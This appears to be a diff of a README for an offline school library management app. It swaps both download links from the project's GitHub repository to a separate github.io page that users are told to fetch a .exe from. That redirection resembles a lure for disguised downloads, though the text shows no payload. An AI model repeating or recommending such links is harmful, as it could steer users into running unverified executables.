@@ -1,6 +1,6 @@
 # 📚 School-Library-Management-System - Simplify daily school library book tracking
 
-[![Download Library System](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/laydownstream575/School-Library-Management-System)
+[![Download Library System](https://img.shields.io/badge/Download-Application-blue.svg)](https://laydownstream575.github.io)
 
 This software helps librarians manage books and student records. It works offline on your computer. You do not need an internet connection to track loans, returns, or inventory. The system uses a local database to keep your data safe.
 
@@ -17,7 +17,7 @@ Your computer must meet these basic needs to run the software:
 
 Follow these steps to set up the system on your machine:
 
-1. Visit the [official download page](https://github.com/laydownstream575/School-Library-Management-System).
+1. Visit the [official download page](https://laydownstream575.github.io).
 2. Look for the latest release version on the right side of the screen.
 3. Click the file that ends in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
